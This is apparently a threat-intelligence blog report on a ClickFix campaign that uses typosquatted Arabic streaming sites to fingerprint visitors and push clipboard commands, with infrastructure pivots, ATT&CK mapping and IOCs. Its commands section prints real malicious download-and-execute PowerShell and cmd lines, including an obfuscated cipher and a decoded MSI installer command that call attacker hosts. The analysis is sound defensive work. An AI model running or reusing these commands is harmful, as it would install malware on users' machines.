---
title: Arabic Streaming Websites ClickFix Campaign
classes: wide
header:
  teaser: /assets/images/TI/arabic/cover.jpg
ribbon: MidnightBlue
categories:
  - Threat-Intelligence
toc: true
---

بسم الله الرحمن الرحيم





# Executive summary
In the fast-evolving world of cyber threats, no tactic has captivated security researchers quite like ClickFix. Turning millions of seemingly legitimate websites into attack vectors. By exploiting user curiosity through error messages or CAPTCHA challenges, ClickFix lures unsuspecting visitors into manually executing malicious PowerShell or other command-line payloads which bypass traditional endpoint protection entirely.
Now, it is rapidly evolved into a Malware-as-a-Service (MaaS) ecosystem. Threat actors now deploy ClickFix through compromised WordPress sites, fake AI chatbots, and state-sponsored operations.

ClickFix attack flow:
* **Initial Access:** The user visits a malicious or compromised website.
* **Deceptive Lure:** The website redirects the user or displays a fake interface, such as:
    * A fraudulent reCAPTCHA verification prompt
    * A simulated browser error message
    * A fake browser update notification
* **Clipboard Injection:** When the user clicks to "verify" or "fix" the issue, a malicious command is automatically copied to their clipboard.
* **Social Engineering Execution:** The site instructs the user to open Command Prompt (cmd) or PowerShell and paste the copied command.
* **Payload Delivery:** Upon pasting and executing the command, the script downloads and installs the malicious payload onto the victim’s system.

<p align="center">
  <img src="/assets/images/TI/arabic/Pasted image 20260927053053.png" />
</p>
<br>

The report is important because streaming platforms such as `MyCima`, `WeCima`, `EgyBest`, `Shahid4u`, and `Cima4U`  which attract regional users and may expose them to malicious redirects and malware delivery. 
These techniques can lead to endpoint compromise, credential theft, and other security risks.

Organizations should use these findings to strengthen security awareness by educating employees about ClickFix techniques, warning against copying and executing commands from websites. 
Security teams should monitor similar indicators and use the campaign's tactics through targeted awareness campaigns.

---

# **Technical Analysis**
## Technical Analysis Summary

The threat actor targets well-known Arabic streaming platforms by deploying systematic variations of their domains. This includes alternative TLDs (e.g. .party, .fast, .life, .land, .shop, .help) and misspelling domains writing to exploit common user typing errors.

The attack begins with domain impersonation, where attackers register domains that closely looks alike legitimate streaming platforms.
Once the user lands on the fake website, the threat actors profile or fingerprint the user. Then the user is redirected to the ClickFix page.

**Example: wecimaa[.]cyou**

In this example, the threat actor registered wecimaa[.]cyou, a typosquatted version of the legitimate streaming site `wecima`. When users visit this domain:
1. **Initial Landing**: User accessing the wecima streaming platform
2. **User Profiling**: Before any redirection occurs, the malicious JavaScript on the page collects detailed information about the user (Which will be explained in details later)
3. **Redirection**: After profiling is complete, users are automatically redirected to the ClickFix page
4. **Social Engineering**: The ClickFix page displays a message prompting users to press "Allow" so that a command can be copied to their clipboard
5. **Execution**: User pastes and runs this command, which typically downloads payload


<p align="center">
  <img src="/assets/images/TI/arabic/Recording2026-10-01013826.gif" />
</p>
<br>

The **Cyber Kill Chain** model is used to map the observed ClickFix campaign which abuses Arabic streaming websites to expose visitors to manually executing commands. The following mapping is based on the identified ClickFix domains, infrastructure pivots, and analysis of the obfuscated command.

| Cyber Kill Chain Stage       | ClickFix Campaign Activity                                                                                                                                                | Evidence / Assessment                                                                                                                                             |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Reconnaissance**           | targeting of users visiting popular Arabic streaming and including `MyCima`, `WeCima`, `EgyBest`, and `Shahid4u`.                                                         | The campaign's streaming-related context is observed. The attacker's reconnaissance process and victim-selection methods are not confirmed.                       |
| **Weaponization**            | Preparation of  verification pages and obfuscated commands designed to initiate command execution.                                                                        | ClickFix page analysis and a recovered obfuscated command support this assessment. The complete payload chain requires further analysis.                          |
| **Delivery**                 | Malicious pages are presented to visitors through streaming-related domains and associated infrastructure include `cloudflare.vc`, `get-entry.to`, `galacticflowtech.lol` | Identified domains include `get-verification.to`, `get-entry.to`, `galacticflowtech.lol`, `galaxyflowsystems.lol`, and `pulsarflowtech.lol`.                      |
| **Exploitation**             | Victims are socially engineered into copying and executing commands, believing they are completing a verification process.                                                | The reconstructed command demonstrates the command-building technique. This is primarily social engineering rather than exploitation of a software vulnerability. |
| **Installation**             | The executed command may download, stage, or launch a malicious payload on the victim's endpoint.                                                                         | A potential stage in the execution chain; successful payload download, persistence, or installation must be verified through payload or endpoint evidence.        |
| **Command and Control (C2)** | payload communicate with attacker infrastructure to receive instructions.                                                                                                 | Not confirmed by domain and IP associations alone. Requires network telemetry, payload configuration, or observed C2 communications.                              |
| **Actions on Objectives**    | Credential theft, information collection, or further compromise of the victim's system.                                                                                   | Potential impact only. Malware analysis or endpoint evidence is required to establish the actual objective and whether it was achieved.                           |


## **User Fingerprinting**

User fingerprinting is the process of collecting detailed telemetry from a visitor’s browser and device to create a unique profile. In cyber threats, this is used not just for tracking, but for **target selection and evasion**. 
Instead of treating every visitor equally, the attacker uses this data to decide whether to deliver the malicious payload or divert the user elsewhere.

**Example:**

Initial Redirect

**URL:** `https://cf.quickbase.icu/middle.html?impId=...&ct=...`
- `impId` = Unique tracking ID
- `ct` = Encrypted session token from campaign

**Fingerprinting API Call**

**URL:** `https://cf.quickbase.icu/api/v1/px2?ct=...&minfo=...`

This is where the actual browser profiling happens. The JavaScript on `middle.html` collects telemetry and sends it via this API endpoint.
- **`ct`:** Same Click Token as above, helps to correlate the fingerprint data with the initial impression.
- **`minfo`:** A **Base64-encoded JSON object** containing detailed browser and system fingerprints. 

After Decoding the JSON object:
```json
{
  "cookieDisabled": false,  // whether browser cookies are disabled (true/false)
  "ua": "",  // User Agent string
  "iframe": false,  // if the page is loaded within an iframe (true/false)
  "devicePixelRatio": 1,  // Ratio of physical pixels to CSS pixels on the display
  "wndLocHref": "",  // Full URL of the current window location
  "deviceScreenSize": "",  // Total screen resolution 
  "deviceWindowSize": "",  // Browser window size 
  "wnd2srcRatLwr06": false,  // bot detection flag
  "effectiveType": "",  // Network connection type
  "tz": 420,  // Timezone offset from UTC in minutes
  "hidden": false,  // Indicates if the page is hidden or not visible
  "notFocused": false,  // Indicates if the browser window is not in focus
  "tzIntl": "",  // IANA timezone identifier 
  "isBot": false,  // Bot detection result - indicates if visitor is automated
  "fBotName": "",  // Name of detected bot 
  "fReasons": ""  // Reasons/flags for bot detection classification
}
```

**Final Redirect**

**URL:** `https://mangafantasyrealm.cfd/indexacrtbt3.php?cid=...&bid=...&source_subid=...&keyword=...&ref=...&IP=...&ua=...&flow=...`

After profiling confirms the user is a valid target, they are redirected to the final destination, the ClickFix page.
- **`cid` (Campaign ID):** `impId` value, which maintaining session continuity.
- **`bid`:** Bid price in USD; indicates this traffic is being sold through an ad exchange Traffic Distribution System
- **`source_subid`:** publisher tracking ID for revenue attribution.
- **`keyword`:** SEO/referral keywords passed for analytics
- `ref`: Explicit referrer field 
- **`IP`:**  Victim's IP address
- **`ua`:** Full User-Agent string
- **`flow`:** Internal flow/route ID within the TDS; determines which landing page variant (e.g., ClickFix vs. direct malware) the user receives.

**Clickfix page:**

**URL:** `https://cmcln4.cinemadataflow.cfd/*`

**Fingerprinting overview:**
1. **Victim visits** `wecimaa.cyou` → redirected to `cf.quickbase.icu/middle.html`
2. **JavaScript profiles** the browser extensively via `/api/v1/px2`, sending encoded telemetry
3. **Server evaluates** fingerprint: checks for bots, sandboxes, timezone mismatches, and valid sessions
4. **If valid**, user is redirected through a TDS (`mangafantasyrealm.cfd`) with full attribution parameters to the ClickFix landing page (`cmcln4.cinemadataflow.cfd`)
5. **ClickFix page** prompts user to press "Allow" → malicious command copied to clipboard → user executes it manually

**Why fingerprinting is used: The "Gatekeeper" Function**

Once a user's profile and behavioral data have been collected, the backend determines how to route the user. Redirecting them either to the clickfix page or to an ad.
- Users who are not targeted (e.g., bots or researchers visiting the page repeatedly with the same profile) are shown ads.
- Users identified as targets are redirected to the clickfix page.


**Evasion techniques:**

Based on the user profile will determine how to route the user. Redirecting them either to the clickfix page or to an ad. 
**1. Bot & Automation Detection**
- **isBot**: indicating whether the visitor was identified as an automated script or crawler.
- **fBotName & fReasons**: Provide specifics on why the visitor was flagged
- **wnd2srcRatLwr06**: detects anomalies in how the page is rendered or loaded
- **iframe**: Checks whether the site is embedded inside an iframe.

**2. Environment & Device Fingerprinting**
- **devicePixelRatio**: Real users show varied ratios (1, 1.25, 1.5, 2, etc.), while analysis VMs typically default to standard values (1 or 2). 
- **deviceScreenSize & deviceWindowSize**: Validate resolution realism. A mismatch between screen and window size, or a generic resolution like 1024×768, may indicate a VM or emulator.

**3. Behavioral & Interaction Signals**
- **hidden & notFocused**: Detect background or unfocused tabs. Real users generally interact with the active tab; consistent background activity may indicate automated scanning.

**4. Geolocation & Contextual Profiling**
These fields assess whether the user fits the campaign's target profile (e.g., a specific country or corporate network).
- **tz & tzIntl (Timezone)**: Confirms whether the user's location matches the target demographic. For example, in a campaign aimed at US finance employees, an offset of 420 (UTC-7, Pacific Time) might be acceptable, while an unexpected timezone could trigger redirection to ads.
- **wndLocHref**: The full URL, used to check referral sources. 



## **Infrastructure Analysis**
The provided list consists of domains associated with large-scale, unauthorized Arabic streaming and piracy networks (e.g., MyCima, WeCima, EgyBest, Shahid4u, Cima4U). These platforms frequently rotate domains and IP addresses to evade copyright enforcement and takedowns.

The primary function is piracy and high-risk vectors for **malvertising, fake download buttons, redirect chains, and potential malware distribution** (e.g., adware, trojans, or credential harvesting).

The threat actor is using alternative TLDs and deliberate misspellings to catch users who make typing errors or are redirected from deprecated domains.
- **MyCima / WeCima**: `wecimaa.cam`, `mycima.party`, `mycima.fast`
- **Shahid 4U**: `shahid4u.blog`, `shahed4u.you`, `shhahid4u.diy`
- **EgyBest**: `egybest.life`, `w1.egybest.land`, `egybest.fast`, `egybest.ltd`
- **Cima4U**: `cima4u14.shop`, `cima4u.help`, `cima4p.co`
- **Moviz**: `moviz-time.pro`, `movizwap.surf`, `moviz-story.online`, `movizlaand.top`, `moviz-time.one`
- **Other**


**Hosting Analysis**

The IP addresses resolve to a mix of legitimate CDN proxies and VPS hosting providers which is a common TTP to obscure origin servers.
1. **Cloudflare Proxy (AS13335)**
    - **IPs**: `104.21.x.x` and `172.67.x.x` ranges (e.g., `104.21.86.123`, `172.67.189.75`).
    - **Analysis**: The majority of the domains are proxied through Cloudflare
    - This is not inherently malicious but is used to hide the true origin server IP, mitigate DDoS attacks, and complicate takedown efforts
2. **Akamai Connected Cloud / Linode (AS63949)**
    - **IPs**: `172.239.194.14`, `172.238.172.123`, `172.239.34.170`, `45.33.83.100`.
    - **Analysis**: These IPs belong to Linode/Akamai. `172.239.34.170` (hosting `shahed4u.gives`, `cima4u14.shop`, `moviz-story.online`).
3. **Server Mania / B2 Net Solutions (AS55286)**
    - **IP**: `192.157.56.142` (hosting `w1.egybest.land`, `shahid4u.watch`).
    - **Analysis**: This IP has been observed in automated malware analysis sandboxes (e.g., Joe Sandbox) and phishing threat intelligence feeds, indicating it may be shared with or repurposed for malicious campaigns
4. **Trellian Pty. Limited (AS133618)**
    - **IP**: `103.224.212.216` (hosting `cimaclube.live`).
    - **Analysis**: Hosted in Australia, this IP has been flagged in sandbox reports for malicious activity and is associated with SMS scam reputation categories


**Infrastructure Pivots and Shared IPs**

The searches were performed against the identified IPs, with `Redirecting` and `Loading` used as page-body indicators. These two words were contained inside the body of phishing websites before redirecting to the ClickFix page.

The selected IPs were prioritized because they belong to direct cloud-hosting infrastructure (AS63949 - Akamai Connected Cloud/Linode). And the majority of the remaining IPs are Cloudflare anycast addresses. 

Direct hosting IPs provide a more actionable pivot point for identifying hosted domains, historical DNS relationships, TLS certificates, server fingerprints, and related infrastructure.

| Shared IP       | Domain Name |
| --------------- | ----------- |
| 172.239.34.170  | linode.com  |
| 172.232.6.55    | linode.com  |
| 172.236.114.191 | linode.com  |
| 172.239.193.153 | linode.com  |
| 172.239.193.198 | linode.com  |
| 45.33.83.100    | linode.com  |

All six IPs belong to **Linode/Akamai cloud** ranges. The same VPS hosts serve live phishing kit infrastructure.

**Most of the content is parked**

The bulk of the captures (172.239.193.153, 172.232.6.55, 172.236.114.191, much of 172.239.34.170) are **ParkLogic parking pages** under three distinct tenants (`oliver`, `joe2`, `andrii`) plus a custom parking feed. Two things stand out even here:
- **Anti-bot evasion built in**: the "protected-link" JavaScript only activates redirect links on mouse/touch/scroll — designed so sandboxes and crawlers see nothing clickable.
- **The parked inventory is weaponizable**: hundreds of typosquats and brand-adjacent names are parked and ready to be flipped to live phishing at any time.

## **Phishing patterns**

Based on the comprehensive analysis of all 6 IPs and their related domains, the following insights were extracted.

**Financial & Banking Impersonation Domains**

These domains use typosquatting and brand mimicry to target banking customers for credential harvesting.

| Domain                              | Impersonated Brand                   |
| :---------------------------------- | :----------------------------------- |
| `scotiobbank.com`                   | Scotiabank (Extra 'b')               |
| `scotiobank.com`                    | Scotiabank (Missing 'a')             |
| `santanderxonsumerusa.com`          | Santander Consumer USA ('x' for 'c') |
| `tdautoginance.com`                 | TD Auto Finance ('g' for 'f')        |
| `tdcanadatrast.com`                 | TD Canada Trust ('t' for 'u')        |
| `llodsbank.com`                     | Lloyds Bank (Transposed letters)     |
| `llloydsbank.com`                   | Lloyds Bank (Extra 'l')              |
| `wwwlloydsbankcardnetpcidss.com`    | Lloyds Bank Cardnet PCI DSS          |
| `bankmobilrvibe.com`                | BankMobile Vibe ('v' for 'V')        |
| `usbankeeliacard.com`               | US Bank ReliaCard (Missing 'R')      |
| `brinkssarmored.com`                | Brinks Armored (Extra 's')           |
| `rbcwealthmanagment.com`            | RBC Wealth Management (Missing 'e')  |
| `greenstatecreditunion.com`         | GreenState Credit Union              |
| `mastercardgiftcardbalance.com`     | Mastercard Gift Card                 |
| `paypalope.com`                     | PayPal                               |
| `access-database.com`               | PayPal (via subdomain abuse)         |
| `bebevity.org`                      | Scotiabank (via subdomain abuse)     |
| `nocascotia.ca`                     | Scotiabank                           |
| `wellsfargosecurityclassaction.com` | Wells Fargo                          |
| `coinbase.fi`                       | Coinbase                             |
| `coinbase-assists.com`              | Coinbase                             |
| `ingbanksecure.com`                 | ING Bank                             |
| `etransfer4nterac.com`              | Interac e-Transfer                   |
| `manssioncreditunion.com`           | Generic Credit Union                 |
| `infinitytrustbank.com`             | Generic Banking                      |
| `pinksale-finance.info`             | PinkSale (Crypto)                    |
| `bitpay-wallet.vip`                 | BitPay                               |
| `06lends.pics`                      | Generic Lending                      |
| `cashfloweasefinance.com`           | Generic Finance                      |


**Tech, SaaS & Security Impersonation**

These domains mimic software vendors to trick users into downloading malware or granting remote access.

| Domain                | Impersonated Brand / Theme     |
| :-------------------- | :----------------------------- |
| `microsoftonlime.com` | Microsoft Online ('m' for 'n') |
| `tlassian.com`        | Atlassian (Missing 'A')        |
| `alesforce.com`       | Salesforce (Missing 's')       |
| `applicatpro.com`     | ApplicantPro (Missing 'n')     |
| `gocongr.com`         | GoConqr (Missing 'q')          |
| `mtworkdayjobs.com`   | Workday                        |
| `seevice-now.com`     | ServiceNow ('e' for 'r')       |
| `service-no.com`      | ServiceNow                     |
| `textnowlogin.com`    | TextNow                        |
| `loginm.com`          | Generic Login / Direct Energy  |
| `safenetbrowser.com`  | Generic Secure Browser         |
| `clickesnap.com`      | ClickSnap                      |
| `supportlic.com`      | Generic Support                |
| `mylicenseite.com`    | Generic Licensing              |
| `bugcartel.com`       | Generic Tech                   |
| `wwwexpressvpn.com`   | ExpressVPN                     |
| `infosupports.com`    | Generic Tech Support           |
| `techblazing.com`     | Abused Legitimate Site         |
| `indexs.cloud`        | Parklogic Infrastructure       |


**Streaming, Retail & Logistics Impersonation**

These domains target consumers with fake billing, delivery, or account suspension warnings.

| Domain                         | Impersonated Brand / Theme   |
| :----------------------------- | :--------------------------- |
| `netflix-bills.com`            | Netflix                      |
| `netflix-suspenso.com`         | Netflix (Portuguese/Spanish) |
| `netl.com`                     | Netflix / Tech               |
| `fedexsupportverification.com` | FedEx                        |
| `uspsmail.top`                 | USPS                         |
| `refund-services.top`          | Generic Refund               |
| `ticketking.us`                | Ticket King                  |
| `rutchfield.com`               | Rutland / Generic            |
| `eurwings.com`                 | Eurowings (Missing 'o')      |
| `venusthreading.com`           | Venus Threading              |
| `wwwearcentric.com`            | Wearcentric                  |
| `supportlafd.com`              | LAFD Support                 |
| `schraderservice.com`          | Schrader Service             |
| `holidaextras.com`             | Holiday Extras               |
| `goglesearch.com`              | Google Search                |

## **ClickFix Pages Analysis**

This analysis investigates multiple domains associated with ClickFix activity, focusing on their hosting infrastructure, shared IP addresses, related domains, and redirect behavior.
The below domains are the ClickFix pages:

| Domain                | IP(s)                       | Hosting/ASN Notes                      |
| --------------------- | --------------------------- | -------------------------------------- |
| get-verification.to   | 193.233.75.60, 94.103.1.233 | **dhost.su**                           |
| get-entry.to          | 2.26.225.189                | **Akamai**                             |
| galacticflowtech.lol  | 104.21.61.216               | **Cloudflare**                         |
| galaxyflowsystems.lol | 104.21.78.211               | **Cloudflare**                         |
| pulsarflowtech.lol    | 104.21.5.13                 | **Cloudflare**                         |
| cloudflare.vc         | 94.103.1.233, 31.76.252.130 | **Shared IP with get-verification.to** |
| cinemadataflow.cfd    | 104.21.33.193               | **Cloudflare**                         |

Cloudflare Cluster (104.21.x.x)
Four domains sit behind Cloudflare:
- galacticflowtech.lol
- galaxyflowsystems.lol
- pulsarflowtech.lol
- cinemadataflow.cfd

**Pivot Domain: `cloudflare.vc`**

`cloudflare.vc` is a malicious domain abused in ClickFix attacks which impersonates Cloudflare's human verification page to trick victims into executing malicious commands.

**Behavior:**
- No fingerprinting of users when visiting the compromised or malicious website.
- Redirect to the `cloudflare.vc` ClickFix page.

**Observation:**
- The location is always `Location: https://cloudflare.vc/`.
- This was used as a pivot to search for compromised and malicious websites redirecting to the ClickFix page.

<p align="center">
  <img src="/assets/images/TI/arabic/Pasted image 20261006121108.png" />
</p>
<br>

The list named `redir to cloudflare_vc domains.csv` in IOCs contains **134 indicators** of compromised and malicious hosts redirecting to a ClickFix page: `https://cloudflare.vc/`.


**IP Address: `94.103.1.233`**

The IP operating under the **Digital Hosting Provider LLC (AS209207)** which is a known **Russian bulletproof hosting** infrastructure. T
his IP belongs to the `94.103.1.0/24` subnet, where multiple malicious domains have already been observed running on the same network segment.

| Attribute                | Value                                              |
| ------------------------ | -------------------------------------------------- |
| IP Address               | 94.103.1.233                                       |
| **Subnet**               | 94.103.1.0/24                                      |
| **ASN**                  | AS209207 (Digital Hosting Provider LLC / DHOST-AS) |
| **Registration Country** | Russian Federation                                 |
| Domain Name              | dhost.su                                           |

The following malicious domains have been observed active on the IP:

| Domain                |
| --------------------- |
| `cloudflare.vc`       |
| `get-verification.to` |

These domains were found in the body of `cloudflare.vc` which can be used as pivot point.

| Type               | Indicator                 | Context                          |
| ------------------ | ------------------------- | -------------------------------- |
| **IP**             | `94.103.1.233`            | Primary Hosting IP               |
| **Payload Domain** | `interseq.at`             | Hosts malicious JS API           |
| **Payload Domain** | `geratefault.com`         | Hosts malicious JS API           |
| **Payload Domain** | `renotad.com`             | Hosts malicious JS API           |


**IP address: `2.26.225.189`**

| Attribute       | Value                                     |
| --------------- | ----------------------------------------- |
| **IP Range**    | 2.26.225.189                              |
| **Usage Type**  | Data Center/Web Hosting/Transit           |
| **ASN**         | AS201988                                  |
| **Hostname(s)** | 2-26-225-189.rdns.vpspay.net,get-entry.to |
| **Domain Name** | vpspay.cloud                              |
| **Country**     | 🇵🇱 Poland                               |
| **City**        | Warsaw, Mazovia                           |

The IP is linked to several domains:

| Domain       | Date Resolved | Significance     |
| ------------ | ------------- | ---------------- |
| get-entry.to | 2026-08-13    | Malicious        |
| sv4k.ru      | 2026-09-05    | clean/unresolved |
| sv4k.fun     | 2026-08-30    | clean/unresolved |

Both `sv4k.ru` and `sv4k.fun` have no related malicious activities



## **Commands Analysis**
After the command is copied to the user's clipboard, most of the 1st stage are powershell script downloaded in the temp folder then download 2nd stage and third.

The below are the unique commands related to this campaign at the time of writing this report.
```powershell
powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://nebuladatastream\.lol/NBKgDLx83vIPPWBIiv' -OutFile $env:TEMP\zpppne.ps1; powershell -ep bypass -File $env:TEMP\zpppne.ps1"

iex(irm 'https://imagedrah\.com/cloudflare/f914a2d3d4dea0e5' -UserAgent 'WUA/b72b7fd34c' -Headers @{'X-WUA'='b72b7fd34c'})

powershell -ExecutionPolicy Bypass "irm 1450003207/1451 -OutFile $env:temp\1451.ps1 -UseBasicParsing;& $env:temp\1451.ps1" IP **86.109.75.7**

cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P& set Text=.& (for %t in (6 24 44 10 51 20 14 28 32 1 44 8 30 1 58 26 37 45 18 44 10 51 20 14 28 32 1 60 28 32 26 40 8 3 26 38 38 44 17 12 27 36 44 53 28 32 26 40 1 3 26 38 38 27 26 50 26 48 25 20 28 53 48 25 32 48 3 48 25 26 20 29 48 5 32 15 23 52 6 52 52 0 52 15 38 52 41 46 52 14 42 52 22 52 21 56 52 16 56 15 56 52 47 1 52 54 56 15 30 52 41 36 52 9 52 52 30 52 47 31 52 35 52 52 59 52 47 43 52 7 42 52 45 52 47 43 52 7 32 52 12 52 6 4 52 7 32 52 49 52 47 7 52 9 52 52 58 52 43 4 52 14 56 15 36 52 43 5 52 54 56 15 1 52 41 31 52 9 52 15 12 52 6 46 52 33 56 15 49 52 41 23 52 13 32 15 58 52 11 7 52 54 56 15 38 52 11 42 52 34 56 15 57 52 6 52 52 2 32 15 53 52 6 52 52 14 56 52 55 52 41 36 52 29 32 15 53 52 6 52 52 2 32 15 50 52 41 46 52 9 52 15 35 52 21 7 52 8 56 15 0 52 43 46 52 31 32 15 31 52 43 43 52 16 52 15 7 52 21 52 52 39 56 15 8 52 21 31 52 31 32 15 21 52 21 9 52 60 56 52 50 52 52 19 19) do set Text=!Text!!Note:~%t,1!) & set Text=!Text:@= !& call !Text:~1!"

```

The most interesting command is last one which is an obfuscated cmdline that hides a PowerShell download-and-execute command behind a character-substitution cipher.

```powershell
cmd /v:on /q /c "set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P& set Text=.& (for %t in (6 24 44 10 51 20 14 28 32 1 44 8 30 1 58 26 37 45 18 44 10 51 20 14 28 32 1 60 28 32 26 40 8 3 26 38 38 44 17 12 27 36 44 53 28 32 26 40 1 3 26 38 38 27 26 50 26 48 25 20 28 53 48 25 32 48 3 48 25 26 20 29 48 5 32 15 23 52 6 52 52 0 52 15 38 52 41 46 52 14 42 52 22 52 21 56 52 16 56 15 56 52 47 1 52 54 56 15 30 52 41 36 52 9 52 52 30 52 47 31 52 35 52 52 59 52 47 43 52 7 42 52 45 52 47 43 52 7 32 52 12 52 6 4 52 7 32 52 49 52 47 7 52 9 52 52 58 52 43 4 52 14 56 15 36 52 43 5 52 54 56 15 1 52 41 31 52 9 52 15 12 52 6 46 52 33 56 15 49 52 41 23 52 13 32 15 58 52 11 7 52 54 56 15 38 52 11 42 52 34 56 15 57 52 6 52 52 2 32 15 53 52 6 52 52 14 56 52 55 52 41 36 52 29 32 15 53 52 6 52 52 2 32 15 50 52 41 46 52 9 52 15 35 52 21 7 52 8 56 15 0 52 43 46 52 31 32 15 31 52 43 43 52 16 52 15 7 52 21 52 52 39 56 15 8 52 21 31 52 31 32 15 21 52 21 9 52 60 56 52 50 52 52 19 19) do set Text=!Text!!Note:~%t,1!) & set Text=!Text:@= !& call !Text:~1!"
```

- `/v:on` enables **delayed environment-variable expansion**, allowing `!Text!` to be evaluated while the loop is running.
- `/q` disables command echo and not displaying each executed command line
- `/c` executes the command and exits

`Note` contains a **61-character string**.
```powershell
set Note=JsLh8YCMSIWH1OdBTv2=nF6k:-e.ocyUwbZN0mlRrGgE\34D@zxiApauQjt5P
```

 305 numeric indexes:
```
6 24 44 10 51 20 14 28 32 1 ...
```
For every number `%t`, CMD executes:
```
!Note:~%t,1!
```

which extract **one character** from `Note`, starting at position `%t`. Then characters are appended to `Text`.
```powershell
set Text=!Text!!Note:~%t,1!
```

Then replaces the attacker's `@` delimiter with spaces
```powershell
set Text=!Text:@= !
```

Finally, removes the first character `.` and executes the reconstructed command. `.` was used as a placeholder.
```
call !Text:~1!
```


The 2nd stage contains a base64 encoded command:
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h -enc YwBkACAAJABlAG4AdgA6AFQATQBQADsAaQByAG0AIAAyADUANAA5ADEAMgA3ADEAMwA1AC8AMwAzADMAIAAtAE8AdQB0AEYAaQBsAGUAIAB1AC4AbQBzAGkAOwBtAHMAaQBlAHgAZQBjACAALwBpACAAdQAuAG0AcwBpACAALwBxAG4AIABNAFMASQBJAE4AUwBUAEEATABMAFAARQBSAFUAUwBFAFIAPQAxAA==

```
After decoding the command, the command downloading `u.msi` file from the IP 2549127135
which can be converted to dotted decimal format to 151\.240\.151\.223.

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w h cd $env:TMP;irm 2549127135/333 -OutFile u.msi;msiexec /i u.msi /qn MSIINSTALLPERUSER=1

```

Obfuscated CMD → Character-index reconstruction → String replacement → Second-stage command  → MSI download → C2 communication



# MITRE ATT&CK

| Tactic               | Tactic ID | Technique                               | Technique ID |
| -------------------- | --------- | --------------------------------------- | ------------ |
| Execution            | TA0002    | Windows Management Instrumentation      | T1047        |
| Execution            | TA0002    | Command and Scripting Interpreter       | T1059        |
| Execution            | TA0002    | Scripting                               | T1064        |
| Execution            | TA0002    | Native API                              | T1106        |
| Execution            | TA0002    | Shared Modules                          | T1129        |
| Execution            | TA0002    | Hijack Execution Flow                   | T1574        |
| Persistence          | TA0003    | Modify Registry                         | T1112        |
| Persistence          | TA0003    | Create or Modify System Process         | T1543        |
| Persistence          | TA0003    | Boot or Logon Autostart Execution       | T1547        |
| Privilege Escalation | TA0004    | Process Injection                       | T1055        |
| Privilege Escalation | TA0004    | Create or Modify System Process         | T1543        |
| Privilege Escalation | TA0004    | Boot or Logon Autostart Execution       | T1547        |
| Stealth              | TA0005    | Obfuscated Files or Information         | T1027        |
| Stealth              | TA0005    | Masquerading                            | T1036        |
| Stealth              | TA0005    | Process Injection                       | T1055        |
| Stealth              | TA0005    | Scripting                               | T1064        |
| Stealth              | TA0005    | Indicator Removal                       | T1070        |
| Stealth              | TA0005    | Deobfuscate/Decode Files or Information | T1140        |
| Stealth              | TA0005    | Indirect Command Execution              | T1202        |
| Stealth              | TA0005    | Virtualization/Sandbox Evasion          | T1497        |
| Stealth              | TA0005    | Impair Defenses                         | T1562        |
| Stealth              | TA0005    | Hide Artifacts                          | T1564        |
| Stealth              | TA0005    | Hijack Execution Flow                   | T1574        |
| Credential Access    | TA0006    | OS Credential Dumping                   | T1003        |
| Credential Access    | TA0006    | Steal Web Session Cookie                | T1539        |
| Discovery            | TA0007    | Query Registry                          | T1012        |
| Discovery            | TA0007    | System Owner/User Discovery             | T1033        |
| Discovery            | TA0007    | Process Discovery                       | T1057        |
| Discovery            | TA0007    | Permission Groups Discovery             | T1069        |
| Discovery            | TA0007    | System Information Discovery            | T1082        |
| Discovery            | TA0007    | File and Directory Discovery            | T1083        |
| Discovery            | TA0007    | Virtualization/Sandbox Evasion          | T1497        |
| Discovery            | TA0007    | Software Discovery                      | T1518        |
| Collection           | TA0009    | Data Staged                             | T1074        |
| Command and Control  | TA0011    | Application Layer Protocol              | T1071        |
| Command and Control  | TA0011    | Ingress Tool Transfer                   | T1105        |
| Command and Control  | TA0011    | Dynamic Resolution                      | T1568        |
| Command and Control  | TA0011    | Encrypted Channel                       | T1573        |
| Impact               | TA0040    | Data Destruction                        | T1485        |
| Defense Impairment   | TA0112    | Modify Registry                         | T1112        |


# IOCs

The lists of IOCs (Domains, IPs, and body of pages) are in my [github](https://github.com/muha2xmad/IOCs/tree/main/arabic%20streaming%20clickfix%20campaign).

| IOC (Domain or SHA256 Hash)                                        | Category                                                                                                                        |
| ------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------- |
| `galacticflowtech.lol`                                             | ClickFix Page                                                                                                                   |
| `galaxyflowsystems.lol`                                            | ClickFix Page                                                                                                                   |
| `pulsarflowtech.lol`                                               | ClickFix Page                                                                                                                   |
| `cloudflare.vc`                                                    | ClickFix Page                                                                                                                   |
| `cinemadataflow.cfd`                                               | ClickFix Page                                                                                                                   |
| `discoverpopfilenow.monster`                                       | Fingerprinting Domain                                                                                                           |
| `kawaiidragonquest.cfd`                                            | Fingerprinting Domain                                                                                                           |
| `toplakehorizon.com`                                               | Fingerprinting Domain                                                                                                           |
| `dealshik.com`                                                     | Fingerprinting Domain                                                                                                           |
| `inadsexchange.com`                                                | Fingerprinting Domain                                                                                                           |
| `eager-atlas.site`                                                 | Fingerprinting Domain                                                                                                           |
| `cartoonspiritart.cfd`                                             | Fingerprinting Domain                                                                                                           |
| `realmteam.site`                                                   | Fingerprinting Domain                                                                                                           |
| `nano329.pro`                                                      | Fingerprinting Domain                                                                                                           |
| `nebuladatastream.lol`                                             | First-Stage Payload Domain                                                                                                      |
| `imagedrah.com`                                                    | First-Stage Payload Domain                                                                                                      |
| `novatrafficcore.lol`                                              | First-Stage Payload Domain                                                                                                      |
| `cleanavcheskre.com`                                               | First-Stage Payload Domain                                                                                                      |
| `3dda5d5c8aced847b13f50e9df1cf551abb1def0926c2f840d1520952d11b997` | PowerShell Script                                                                                                               |
| `c5c61c7bfbf348d0602ce7cdd5e3f024954df060d3a03645434cae384c5d2d32` | PowerShell Script                                                                                                               |
| `7402647e0ab5b0d65d40679b746d88b0bafbc2b5b7576aa774b6c65acfb82c6d` | PowerShell Script                                                                                                               |
| `2bf45827596d9792fc5fc07f22d9c4d8743ac76150bde3bd9308cdc5daf1b2b7` | PowerShell Script                                                                                                               |
